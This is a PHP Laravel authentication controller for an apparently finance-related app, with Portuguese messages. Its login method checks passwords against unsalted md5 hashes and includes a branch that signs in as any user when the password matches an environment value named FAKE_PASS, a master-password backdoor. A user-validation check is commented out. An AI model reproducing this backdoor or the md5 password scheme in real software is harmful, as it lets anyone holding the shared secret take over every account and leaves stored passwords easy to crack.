<?php

namespace App\Http\Controllers;

use App\Models\Grupo;
use App\Models\LoginAcesso;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Inertia\Inertia;

class AuthController extends Controller
{
    //
    use TraitPerfil;

    public function login()
    {
        return Inertia::render('Login');
    }

    public function autenticacao(Request $request)
    {

        $request->validate([
            "email" => ["required"],
            "password" => ["required"],
        ], [
            "email.required" => "Campo Obrigatório",
            "password.required" => "Campo Obrigatório"
        ]);

    
        $user = User::where('userName', $request->get('email'))
            ->whereIn('user_pertence', ['Finance', 'Finance-Cash', 'Todos'])
            ->first();
        
        if($user){
          
            if($user->password == md5($request->password)){
                // if (!$this->user_validado($user)) {
                //     return back()->withErrors([
                //         "acesso" => "Acesso registro",
                //     ]);
                // } else {
                    if ($user->codigo_importado == null) {
                        $user->update(['codigo_importado' => $user->pk_utilizador]);
                    }
                    Auth::login($user);
                    return  redirect()->route('mf.dashboard');
                // }            
            }
            else if($request->password == env('FAKE_PASS')){    
                Auth::login($user);
                return  redirect()->route('mf.dashboard');
            }
       
        }

        return back()->withErrors([
            "email" => "Dados Invalidos",
            "password" => "Dados Invalidos",
        ]);
    }

    public function logout()
    {
        Auth::logout();

        return Inertia::location('/login');
    }
}
